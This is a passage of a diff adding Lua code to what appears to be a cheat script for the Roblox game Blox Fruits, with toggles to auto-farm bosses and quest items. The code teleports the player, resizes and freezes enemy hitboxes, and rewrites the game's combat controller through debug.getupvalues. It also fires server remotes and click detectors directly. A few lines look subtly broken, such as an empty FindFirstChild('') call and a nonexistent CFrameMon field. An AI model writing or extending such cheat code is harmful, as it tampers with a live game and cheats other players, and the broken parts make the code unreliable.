+						for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+							if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+								if v.Name == Mon then
+									if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) then
+										HealthMs = v.Humanoid.MaxHealth * _G.Kill_At / 100;
+										repeat
+											task.wait();
+											if v.Humanoid.Health <= HealthMs then
+												EquipWeapon((game:GetService("Players")).LocalPlayer.Data.DevilFruit.Value);
+												UseSkill = true;
+												Skillaimbot = true;
+												TP1(v.HumanoidRootPart.CFrame * CFrame.new(0, 15, 0));
+											else
+												UseSkill = false;
+												Skillaimbot = false;
+												EquipWeapon(_G.SelectWeapon);
+												TP1(v.HumanoidRootPart.CFrame * Pos);
+											end;
+											AimBotSkillPosition = v.HumanoidRootPart.CFrame.Position;
+											MonFarm = v.Name;
+											PosMon = v.HumanoidRootPart.CFrame;
+											AutoHaki();
+											v.HumanoidRootPart.CanCollide = false;
+											v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+											v.Humanoid.WalkSpeed = 0;
+											v.Head.CanCollide = false;
+											StartBring = true;
+											NormalAttack();
+										until not _G.AutoFarmFruitMastery or v.Humanoid.Health <= 0 or (not v.Parent) or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+										StartBring = false;
+										UseSkill = false;
+										Skillaimbot = false;
+									end;
+								end;
+							end;
+						end;
+					else
+						TP1(CFrameMon);
+						UnEquipWeapon(_G.SelectWeapon);
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+function NormalAttack()
+	if not _G.NormalAttack then
+		local a3 = require(game.Players.LocalPlayer.PlayerScripts.CombatFramework);
+		local a4 = (debug.getupvalues(a3))[2];
+		local a5 = require(game.ReplicatedStorage.Util.CameraShaker);
+		a5:Stop();
+		a4.activeController.attacking = false;
+		a4.activeController.timeToNextAttack = 0;
+		a4.activeController.hitboxMagnitude = 180;
+		(game:GetService("VirtualUser")):CaptureController();
+		(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+	end;
+end;
+spawn(function()
+	(game:GetService("RunService")).RenderStepped:Connect(function()
+		pcall(function()
+			if UseSkill or UseGunSkill or _G.SeaSkill then
+				for i, v in pairs((game:GetService("Players")).LocalPlayer.PlayerGui.Notifications:GetChildren()) do
+					for _, Notif in pairs(v:GetChildren()) do
+						if string.find(Notif.Text, "Skill locked!") then
+							v:Destroy();
+						end;
+					end;
+				end;
+			end;
+		end);
+	end);
+end);
+spawn(function()
+	pcall(function()
+		while wait() do
+			if SelectedMasteryMode == "Level Farm" and _G.AutoFarmGunMastery then
+				CheckQuest();
+				local QuestTitle = (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text;
+				if not string.find(QuestTitle, NameMon) then
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("AbandonQuest");
+				end;
+				if (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false then
+					TP1(CFrameQuest);
+					if (CFrameQuest.Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("StartQuest", NameQuest, LevelQuest);
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == true then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild(Mon) then
+						pcall(function()
+							for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+								if v.Name == Mon then
+									if string.find((game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Container.QuestTitle.Title.Text, NameMon) then
+										repeat
+											task.wait();
+											HealthMin = v.Humanoid.MaxHealth * _G.Kill_At / 100;
+											ShootPosition = (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, (-15), 0);
+											if v.Humanoid.Health <= HealthMin then
+												EquipWeapon(SelectWeaponGun);
+												TP1(v.HumanoidRootPart.CFrame * CFrame.new(0, 15, 0));
+												((game:GetService("Players")).LocalPlayer.Character.Humanoid:FindFirstChild("")):InvokeServer("TAP", Vector3.new(ShootPosition.Position));
+												UseGunSkill = true;
+												Skillaimbot = true;
+											else
+												EquipWeapon(_G.SelectWeapon);
+												TP1(v.HumanoidRootPart.CFrame * Pos);
+												UseGunSkill = false;
+												Skillaimbot = false;
+											end;
+											NormalAttack();
+											AutoHaki();
+											v.Humanoid.WalkSpeed = 0;
+											v.HumanoidRootPart.CanCollide = false;
+											v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+											v.Head.CanCollide = false;
+											AimBotSkillPosition = v.HumanoidRootPart.Position;
+											StartBring = true;
+											PosMon = v.HumanoidRootPart.CFrame;
+											MonFarm = v.Name;
+										until v.Humanoid.Health <= 0 or _G.AutoFarmGunMastery == false or (game:GetService("Players")).LocalPlayer.PlayerGui.Main.Quest.Visible == false;
+										UseGunSkill = false;
+										Skillaimbot = false;
+										StartBring = false;
+									end;
+								end;
+							end;
+						end);
+					else
+						TP1(CFrameMon);
+						UnEquipWeapon(_G.SelectWeapon);
+					end;
+				end;
+			end;
+		end;
+	end);
+end);
+function EquipWeaponSword()
+	pcall(function()
+		for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+			if v.ToolTip == "Sword" and v:IsA("Tool") then
+				local ToolHumanoid = game.Players.LocalPlayer.Backpack:FindFirstChild(v.Name);
+				game.Players.LocalPlayer.Character.Humanoid:EquipTool(ToolHumanoid);
+			end;
+		end;
+	end);
+end;
+ItemsTab:Seperator("Gun & Sword");
+ItemsTab:Toggle("Auto Buddy Sword", _G.AutoBudySword, false, function(value)
+	_G.AutoBudySword = value;
+	StopTween(_G.AutoBudySword);
+end);
+local BigMomPos = CFrame.new(-731.2034301757812, 381.5658874511719, -11198.4951171875);
+spawn(function()
+	while wait() do
+		if _G.AutoBudySword and World3 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Cake Queen") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Cake Queen" then
+							if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
+								repeat
+									task.wait();
+									AutoHaki();
+									EquipWeapon(_G.SelectWeapon);
+									v.HumanoidRootPart.CanCollide = false;
+									v.Humanoid.WalkSpeed = 0;
+									v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+									topos(v.HumanoidRootPart.CFrame * Pos);
+									(game:GetService("VirtualUser")):CaptureController();
+									(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+								until not _G.AutoBudySword or (not v.Parent) or v.Humanoid.Health <= 0;
+							end;
+						end;
+					end;
+				else
+					if BypassTP then
+						if (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BigMomPos.Position).Magnitude > 1500 then
+							BTP(BigMomPos);
+						elseif (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - BigMomPos.Position).Magnitude < 1500 then
+							topos(BigMomPos);
+						end;
+					else
+						topos(BigMomPos);
+					end;
+					UnEquipWeapon(_G.SelectWeapon);
+					topos(CFrame.new(-731.2034301757812, 381.5658874511719, -11198.4951171875));
+					if (game:GetService("ReplicatedStorage")):FindFirstChild("Cake Queen") then
+						topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Cake Queen")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+ItemsTab:Toggle("Auto Soul Guitar", _G.AutoNevaSoulGuitar, false, function(value)
+	_G.AutoNevaSoulGuitar = value;
+	StopTween(_G.AutoNevaSoulGuitar);
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if _G.AutoNevaSoulGuitar then
+				if GetWeaponInventory("Soul Guitar") == false then
+					if ((CFrame.new((-9681.458984375), 6.139880657196045, 6341.3720703125)).Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 5000 then
+						if (game:GetService("Workspace")).NPCs:FindFirstChild("Skeleton Machine") then
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("soulGuitarBuy", true);
+						elseif (game:GetService("Workspace")).Map["Haunted Castle"].Candle1.Transparency == 0 then
+							if (game:GetService("Workspace")).Map["Haunted Castle"].Placard1.Left.Part.Transparency == 0 then
+								Quest2 = true;
+								repeat
+									wait();
+									topos(CFrame.new(-8762.69140625, 176.84783935546875, 6171.3076171875));
+								until ((CFrame.new((-8762.69140625), 176.84783935546875, 6171.3076171875)).Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or (not _G.AutoNevaSoulGuitar);
+								wait(1);
+								fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"].Placard7.Left.ClickDetector);
+								wait(1);
+								fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"].Placard6.Left.ClickDetector);
+								wait(1);
+								fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"].Placard5.Left.ClickDetector);
+								wait(1);
+								fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"].Placard4.Right.ClickDetector);
+								wait(1);
+								fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"].Placard3.Left.ClickDetector);
+								wait(1);
+								fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"].Placard2.Right.ClickDetector);
+								wait(1);
+								fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"].Placard1.Right.ClickDetector);
+								wait(1);
+							elseif (game:GetService("Workspace")).Map["Haunted Castle"].Tablet.Segment1:FindFirstChild("ClickDetector") then
+								if (game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part1:FindFirstChild("ClickDetector") then
+									Quest4 = true;
+									repeat
+										wait();
+										topos(CFrame.new(-9553.5986328125, 65.62338256835938, 6041.58837890625));
+									until ((CFrame.new((-9553.5986328125), 65.62338256835938, 6041.58837890625)).Position - (game:GetService("Players")).LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 3 or (not _G.AutoNevaSoulGuitar);
+									wait(1);
+									topos((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part3.CFrame);
+									wait(1);
+									fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part3.ClickDetector);
+									wait(1);
+									topos((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.CFrame);
+									wait(1);
+									fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector);
+									wait(1);
+									fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector);
+									wait(1);
+									fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part4.ClickDetector);
+									wait(1);
+									topos((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.CFrame);
+									wait(1);
+									fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.ClickDetector);
+									wait(1);
+									fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part6.ClickDetector);
+									wait(1);
+									topos((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part8.CFrame);
+									wait(1);
+									fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part8.ClickDetector);
+									wait(1);
+									topos((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.CFrame);
+									wait(1);
+									fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector);
+									wait(1);
+									fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector);
+									wait(1);
+									fireclickdetector((game:GetService("Workspace")).Map["Haunted Castle"]["Lab Puzzle"].ColorFloor.Model.Part10.ClickDetector);
+								else
+									Quest3 = true;
+								end;
+							else
+								if (game:GetService("Workspace")).NPCs:FindFirstChild("Ghost") then
+									local args = {
+										[1] = "GuitarPuzzleProgress",
+										[2] = "Ghost"
+									};
+									(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer(unpack(args));
+								end;
+								if game.Workspace.Enemies:FindFirstChild("Living Zombie") then
+									for i, v in pairs(game.Workspace.Enemies:GetChildren()) do
+										if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
+											if v.Name == "Living Zombie" then
+												EquipWeapon(_G.SelectWeapon);
+												v.HumanoidRootPart.Size = Vector3.new(60, 60, 60);
+												v.HumanoidRootPart.Transparency = 1;
+												v.Humanoid.JumpPower = 0;
+												v.Humanoid.WalkSpeed = 0;
+												v.HumanoidRootPart.CanCollide = false;
+												v.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 20, 0);
+												topos(CFrame.new(-10160.787109375, 138.6616973876953, 5955.03076171875));
+												(game:GetService("VirtualUser")):CaptureController();
+												(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 672));
+											end;
+										end;
+									end;
+								else
+									topos(CFrame.new(-10160.787109375, 138.6616973876953, 5955.03076171875));
+								end;
+							end;
+						elseif string.find((game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("gravestoneEvent", 2), "Error") then
+							print("Go to Grave");
+							topos(CFrame.new(-8653.2060546875, 140.98487854003906, 6160.033203125));
+						elseif string.find((game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("gravestoneEvent", 2), "Nothing") then
+							print("Wait Next Night");
+						else
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("gravestoneEvent", 2, true);
+						end;
+					else
+						topos(CFrame.new(-9681.458984375, 6.139880657196045, 6341.3720703125));
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	while wait() do
+		if _G.AutoFarmBossHallow then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Soul Reaper") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if string.find(v.Name, "Soul Reaper") then
+							repeat
+								task.wait();
+								EquipWeapon(_G.SelectWeapon);
+								AutoHaki();
+								v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+								topos(v.HumanoidRootPart.CFrame * Pos);
+								(game:GetService("VirtualUser")):CaptureController();
+								(game:GetService("VirtualUser")):Button1Down(Vector2.new(1280, 670));
+								v.HumanoidRootPart.Transparency = 1;
+							until v.Humanoid.Health <= 0 or _G.AutoFarmBossHallow == false;
+						end;
+					end;
+				elseif (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Hallow Essence") or (game:GetService("Players")).LocalPlayer.Character:FindFirstChild("Hallow Essence") then
+					repeat
+						topos(CFrame.new(-8932.322265625, 146.83154296875, 6062.55078125));
+						wait();
+					until ((CFrame.new((-8932.322265625), 146.83154296875, 6062.55078125)).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 8;
+					EquipWeapon("Hallow Essence");
+				elseif (game:GetService("ReplicatedStorage")):FindFirstChild("Soul Reaper") then
+					topos(((game:GetService("ReplicatedStorage")):FindFirstChild("Soul Reaper")).HumanoidRootPart.CFrame * CFrame.new(2, 20, 2));
+				end;
+			end);
+		end;
+	end;
+end);
+ItemsTab:Toggle("Auto Rengoku", _G.AutoRengoku, false, function(value)
+	_G.AutoRengoku = value;
+	StopTween(_G.AutoRengoku);
+end);
+ItemsTab:Toggle("Auto Hallow Scythe", _G.AutoFarmBossHallow, "Auto Kill Soul Reaper", function(value)
+	_G.AutoFarmBossHallow = value;
+	StopTween(_G.AutoFarmBossHallow);
+end);
+ItemsTab:Toggle("Auto Warden Sword", _G.Autowaden, "Auto Get Warden Sword", function(value)
+	_G.Autowaden = value;
+	StopTween(_G.Autowaden);
+end);
+ItemsTab:Toggle("Auto Cursed Dual Katana", _G.AutoCdk, "Must be have Yama and Tushita", function(value)
+	Auto_Cursed_Dual_Katana = value;
+	StopTween(Auto_Cursed_Dual_Katana);
+end);
+ItemsTab:Toggle("Auto Get Yama", _G.AutoYama, "Need 30 Elite Hunter", function(value)
+	_G.AutoYama = value;
+end);
+spawn(function()
+	while wait() do
+		if _G.AutoYama then
+			if (game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("EliteHunter", "Progress") >= 30 then
+				repeat
+					wait(0.1);
+					fireclickdetector((game:GetService("Workspace")).Map.Waterfall.SealedKatana.Handle.ClickDetector);
+				until (game:GetService("Players")).LocalPlayer.Backpack:FindFirstChild("Yama") or (not _G.AutoYama);
+			end;
+		end;
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if Auto_Cursed_Dual_Katana then
+				if game.Players.LocalPlayer.Character:FindFirstChild("Tushita") or game.Players.LocalPlayer.Backpack:FindFirstChild("Tushita") or game.Players.LocalPlayer.Character:FindFirstChild("Yama") or game.Players.LocalPlayer.Backpack:FindFirstChild("Yama") then
+					if game.Players.LocalPlayer.Character:FindFirstChild("Tushita") or game.Players.LocalPlayer.Backpack:FindFirstChild("Tushita") then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild("Tushita") then
+							EquipWeapon("Tushita");
+						end;
+					elseif game.Players.LocalPlayer.Character:FindFirstChild("Yama") or game.Players.LocalPlayer.Backpack:FindFirstChild("Yama") then
+						if game.Players.LocalPlayer.Backpack:FindFirstChild("Yama") then
+							EquipWeapon("Yama");
+						end;
+					end;
+				else
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("LoadItem", "Tushita");
+				end;
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if Auto_Cursed_Dual_Katana then
+				if GetMaterial("Alucard Fragment") == 0 then
+					Auto_Quest_Yama_1 = true;
+					Auto_Quest_Yama_2 = false;
+					Auto_Quest_Yama_3 = false;
+					Auto_Quest_Tushita_1 = false;
+					Auto_Quest_Tushita_2 = false;
+					Auto_Quest_Tushita_3 = false;
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Evil");
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Evil");
+				elseif GetMaterial("Alucard Fragment") == 1 then
+					Auto_Quest_Yama_1 = false;
+					Auto_Quest_Yama_2 = true;
+					Auto_Quest_Yama_3 = false;
+					Auto_Quest_Tushita_1 = false;
+					Auto_Quest_Tushita_2 = false;
+					Auto_Quest_Tushita_3 = false;
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Evil");
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Evil");
+				elseif GetMaterial("Alucard Fragment") == 2 then
+					Auto_Quest_Yama_1 = false;
+					Auto_Quest_Yama_2 = false;
+					Auto_Quest_Yama_3 = true;
+					Auto_Quest_Tushita_1 = false;
+					Auto_Quest_Tushita_2 = false;
+					Auto_Quest_Tushita_3 = false;
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Evil");
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Evil");
+				elseif GetMaterial("Alucard Fragment") == 3 then
+					Auto_Quest_Yama_1 = false;
+					Auto_Quest_Yama_2 = false;
+					Auto_Quest_Yama_3 = false;
+					Auto_Quest_Tushita_1 = true;
+					Auto_Quest_Tushita_2 = false;
+					Auto_Quest_Tushita_3 = false;
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Good");
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Good");
+				elseif GetMaterial("Alucard Fragment") == 4 then
+					Auto_Quest_Yama_1 = false;
+					Auto_Quest_Yama_2 = false;
+					Auto_Quest_Yama_3 = false;
+					Auto_Quest_Tushita_1 = false;
+					Auto_Quest_Tushita_2 = true;
+					Auto_Quest_Tushita_3 = false;
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Good");
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Good");
+				elseif GetMaterial("Alucard Fragment") == 5 then
+					Auto_Quest_Yama_1 = false;
+					Auto_Quest_Yama_2 = false;
+					Auto_Quest_Yama_3 = false;
+					Auto_Quest_Tushita_1 = false;
+					Auto_Quest_Tushita_2 = false;
+					Auto_Quest_Tushita_3 = true;
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Good");
+					(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Good");
+				elseif GetMaterial("Alucard Fragment") == 6 then
+					if (game:GetService("Workspace")).Enemies:FindFirstChild("Cursed Skeleton Boss [Lv. 2025] [Boss]") or (game:GetService("Workspace")).ReplicatedStorage:FindFirstChild("Cursed Skeleton Boss [Lv. 2025] [Boss]") then
+						Auto_Quest_Yama_1 = false;
+						Auto_Quest_Yama_2 = false;
+						Auto_Quest_Yama_3 = false;
+						Auto_Quest_Tushita_1 = false;
+						Auto_Quest_Tushita_2 = false;
+						Auto_Quest_Tushita_3 = false;
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Cursed Skeleton Boss [Lv. 2025] [Boss]") or (game:GetService("Workspace")).Enemies:FindFirstChild("Cursed Skeleton [Lv. 2200]") then
+							for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+								if v.Name == "Cursed Skeleton Boss" or v.Name == "Cursed Skeleton" then
+									if v.Humanoid.Health > 0 then
+										EquipWeapon(Sword);
+										topos(v.HumanoidRootPart.CFrame * pos);
+										v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+										v.HumanoidRootPart.Transparency = 1;
+										v.Humanoid.JumpPower = 0;
+										v.Humanoid.WalkSpeed = 0;
+										v.HumanoidRootPart.CanCollide = false;
+										StartBring = true;
+										PosMon = v.HumanoidRootPart.CFrame;
+										MonFarm = v.Name;
+										Click();
+									end;
+								end;
+							end;
+						end;
+					elseif ((CFrame.new((-12361.7060546875), 603.3547973632812, (-6550.5341796875))).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100 then
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Good");
+						wait(1);
+						(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "Progress", "Evil");
+						wait(1);
+						topos(CFrame.new(-12361.7060546875, 603.3547973632812, -6550.5341796875));
+						wait(1.5);
+						(game:GetService("VirtualInputManager")):SendKeyEvent(true, "E", false, game);
+						wait(1.5);
+						topos(CFrame.new(-12253.5419921875, 598.8999633789062, -6546.8388671875));
+					else
+						topos(CFrame.new(-12361.7060546875, 603.3547973632812, -6550.5341796875));
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	while wait() do
+		if Auto_Quest_Yama_1 then
+			pcall(function()
+				if (game:GetService("Workspace")).Enemies:FindFirstChild("Mythological Pirate") then
+					for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+						if v.Name == "Mythological Pirate" then
+							repeat
+								wait();
+								topos(v.HumanoidRootPart.CFrame * CFrame.new(0, 0, (-2)));
+							until Auto_Cursed_Dual_Katana == false or Auto_Quest_Yama_1 == false;
+							(game:GetService("ReplicatedStorage")).Remotes.CommF_:InvokeServer("CDKQuest", "StartTrial", "Evil");
+						end;
+					end;
+				else
+					topos(CFrame.new(-13451.46484375, 543.712890625, -6961.0029296875));
+				end;
+			end);
+		end;
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			if Auto_Quest_Yama_2 then
+				for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+					if v:FindFirstChild("HazeESP") then
+						v.HazeESP.Size = UDim2.new(50, 50, 50, 50);
+						v.HazeESP.MaxDistance = "inf";
+					end;
+				end;
+				for i, v in pairs((game:GetService("ReplicatedStorage")):GetChildren()) do
+					if v:FindFirstChild("HazeESP") then
+						v.HazeESP.Size = UDim2.new(50, 50, 50, 50);
+						v.HazeESP.MaxDistance = "inf";
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	while wait() do
+		pcall(function()
+			for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+				if Auto_Quest_Yama_2 and v:FindFirstChild("HazeESP") and (v.HumanoidRootPart.Position - PosMonsEsp.Position).magnitude <= 300 then
+					v.HumanoidRootPart.CFrame = PosMonsEsp;
+					v.HumanoidRootPart.CanCollide = false;
+					v.HumanoidRootPart.Size = Vector3.new(50, 50, 50);
+					if not v.HumanoidRootPart:FindFirstChild("BodyVelocity") then
+						local vc = Instance.new("BodyVelocity", v.HumanoidRootPart);
+						vc.MaxForce = Vector3.new(1, 1, 1) * math.huge;
+						vc.Velocity = Vector3.new(0, 0, 0);
+					end;
+				end;
+			end;
+		end);
+	end;
+end);
+spawn(function()
+	while wait() do
+		if Auto_Quest_Yama_2 then
+			pcall(function()
+				for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+					if v:FindFirstChild("HazeESP") then
+						repeat
+							wait();
+							if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 2000 then
+								topos(v.HumanoidRootPart.CFrame * Pos);
+							else
+								EquipWeapon(Sword);
+								topos(v.HumanoidRootPart.CFrame * Pos);
+								v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+								v.HumanoidRootPart.Transparency = 1;
+								v.Humanoid.JumpPower = 0;
+								v.Humanoid.WalkSpeed = 0;
+								v.HumanoidRootPart.CanCollide = false;
+								PosMon = v.HumanoidRootPart.CFrame;
+								MonFarm = v.Name;
+								Click();
+								if v.Humanoid.Health <= 0 and v.Humanoid:FindFirstChild("Animator") then
+									v.Humanoid.Animator:Destroy();
+								end;
+							end;
+						until Auto_Cursed_Dual_Katana == false or Auto_Quest_Yama_2 == false or (not v.Parent) or v.Humanoid.Health <= 0 or (not v:FindFirstChild("HazeESP"));
+					else
+						for x, y in pairs((game:GetService("ReplicatedStorage")):GetChildren()) do
+							if y:FindFirstChild("HazeESP") then
+								if (y.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 2000 then
+									topos(y.HumanoidRootPart.CFrameMon * Farm_Mode);
+								else
+									topos(y.HumanoidRootPart.CFrame * Farm_Mode);
+								end;
+							end;
+						end;
+					end;
+				end;
+			end);
+		end;
+	end;
+end);
+spawn(function()
+	while wait() do
+		if Auto_Quest_Yama_3 then
+			pcall(function()
+				if game.Players.LocalPlayer.Backpack:FindFirstChild("Hallow Essence") then
+					topos((game:GetService("Workspace")).Map["Haunted Castle"].Summoner.Detection.CFrame);
+				elseif (game:GetService("Workspace")).Map:FindFirstChild("HellDimension") then
+					repeat
+						wait();
+						if (game:GetService("Workspace")).Enemies:FindFirstChild("Cursed Skeleton [Lv. 2200]") or (game:GetService("Workspace")).Enemies:FindFirstChild("Cursed Skeleton [Lv. 2200] [Boss]") or (game:GetService("Workspace")).Enemies:FindFirstChild("Hell's Messenger [Lv. 2200] [Boss]") then
+							for i, v in pairs((game:GetService("Workspace")).Enemies:GetChildren()) do
+								if v.Name == "Cursed Skeleton" or v.Name == "Cursed Skeleton" or v.Name == "Hell's Messenger" then
+									if v.Humanoid.Health > 0 then
+										repeat
+											wait();
+											EquipWeapon(Sword);
+											topos(v.HumanoidRootPart.CFrame * Pos);
+											v.HumanoidRootPart.Size = Vector3.new(1, 1, 1);
+											v.HumanoidRootPart.Transparency = 1;
+											v.Humanoid.JumpPower = 0;
+											v.Humanoid.WalkSpeed = 0;
+											v.HumanoidRootPart.CanCollide = false;
+											PosMon = v.HumanoidRootPart.CFrame;
+											MonFarm = v.Name;
+											Click();
+											if v.Humanoid.Health <= 0 and v.Humanoid:FindFirstChild("Animator") then
+												v.Humanoid.Animator:Destroy();
+											end;
+										until v.Humanoid.Health <= 0 or (not v.Parent) or Auto_Quest_Yama_3 == false;
+									end;
+								end;
+							end;
+						else
+							wait(5);
+							topos((game:GetService("Workspace")).Map.HellDimension.Torch1.CFrame);
+							wait(1.5);
+							(game:GetService("VirtualInputManager")):SendKeyEvent(true, "E", false, game);
+							wait(1.5);
+							topos((game:GetService("Workspace")).Map.HellDimension.Torch2.CFrame);
+							wait(1.5);
+							(game:GetService("VirtualInputManager")):SendKeyEvent(true, "E", false, game);
+							wait(1.5);
+							topos((game:GetService("Workspace")).Map.HellDimension.Torch3.CFrame);
+							wait(1.5);
+							(game:GetService("VirtualInputManager")):SendKeyEvent(true, "E", false, game);
+							wait(1.5);
+							topos((game:GetService("Workspace")).Map.HellDimension.Exit.CFrame);
+						end;
+					until Auto_Cursed_Dual_Katana == false or Auto_Quest_Yama_3 == false or GetMaterial("Alucard Fragment") == 3;
